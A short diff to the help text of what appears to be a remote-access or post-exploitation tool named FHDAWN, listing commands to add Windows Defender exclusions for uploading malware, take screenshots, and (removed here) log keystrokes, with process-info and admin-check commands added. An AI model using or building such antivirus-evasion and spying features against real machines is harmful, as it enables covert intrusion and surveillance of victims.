@@ -93,9 +93,8 @@ HELP
 -. (UAC)* windefender_exclude - Add Windows Defender Exclusions.
     - To Upload Malware, add Exclusion and upload malware to that directory.
 -. screenshot - Take Screenshot.
--. keylog_start - Start keystroke logging.
--. keylog_stop - Stop keystroke logging, And dump keylogs.
-
+-. psinfo - Get process information.
+-. isadmin - Check if FHDAWN has administrator rights.
 ----------------------------------
 POST Exploitation
 ----------------------------------
